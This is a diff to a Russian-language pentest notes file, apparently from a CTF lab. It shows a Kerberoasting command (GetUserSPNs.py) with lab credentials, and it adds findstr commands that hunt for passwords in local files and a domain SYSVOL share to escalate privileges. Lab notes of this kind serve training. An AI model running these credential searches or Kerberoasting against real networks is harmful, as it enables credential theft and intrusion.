@@ -121,7 +121,9 @@ python3 GetUserSPNs.py -dc-ip 10.10.154.84 lab.enterprise.thm/nik:ToastyBoi! -re
 
    Скрипты векторов повышения привелегий
 
-cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config
+cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config *.vbs
+
+findstr /s /p /i /n /m "password" \\ta-d.local\SYSVOL\*.xml *.ini *.txt *.config *.vbs
 
 Systeminfo - отображает подробную информацию о конфигурации компьютера и его операционной системы, включая конфигурацию операционной системы, информацию о безопасности, идентификатор продукта и свойства оборудования (например, ОЗУ, место на диске и сетевые карты).
 Systeminfo перенаправил в текстовик, после этого я загрузил на Kali этот файл, и сейчас будем смотреть в него
